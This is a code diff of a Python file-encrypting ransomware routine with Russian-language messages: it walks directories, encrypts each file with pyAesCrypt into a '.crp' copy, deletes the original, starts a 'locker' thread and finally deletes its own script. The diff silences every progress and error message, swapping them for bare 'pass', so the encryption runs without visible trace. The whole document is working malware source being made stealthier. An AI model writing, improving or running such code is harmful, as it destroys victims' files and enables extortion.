@@ -106,18 +106,20 @@ def crypter():
         try:
             # Пропускаем файлы с расширением .crp
             if file.endswith(".crp"):
-                print(f"Пропуск файла {file}, так как он уже зашифрован.")
+                # print(f"Пропуск файла {file}, так как он уже зашифрован.")
                 return
 
-            print(f"Шифруем файл: {file}")
+            # print(f"Шифруем файл: {file}")
             password = crypt_pass
             bufferSize = 512 * 1024
             pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
             os.remove(file)
         except OSError as e:
-            print(f"Ошибка при обработке файла {file}: {e}")
+            pass
+            # print(f"Ошибка при обработке файла {file}: {e}")
         except ValueError as e:
-            print(f"Невозможно прочитать файл {file}: {e}")
+            pass
+            # print(f"Невозможно прочитать файл {file}: {e}")
 
     def walk(dir, ext):
         try:
@@ -132,15 +134,17 @@ def crypter():
                 elif os.path.isdir(path):
                     walk(path, ext)
         except FileNotFoundError:
-            print(f"Директория {dir} не найдена. Пропускаем...")
+            pass
+            # print(f"Директория {dir} не найдена. Пропускаем...")
         except PermissionError:
-            print(f"Нет доступа к директории {dir}. Пропускаем...")
+            pass
+            # print(f"Нет доступа к директории {dir}. Пропускаем...")
 
     for directory, ext in directories:
-        print(f"Начинаем шифрование в {directory} с расширением {ext if ext else 'все файлы'}...")
+        # print(f"Начинаем шифрование в {directory} с расширением {ext if ext else 'все файлы'}...")
         walk(directory, ext)
 
-    print("Encryption complete.")
+    # print("Encryption complete.")
     os.remove(sys.argv[0])
 
 thread_1 = Thread(target=locker)
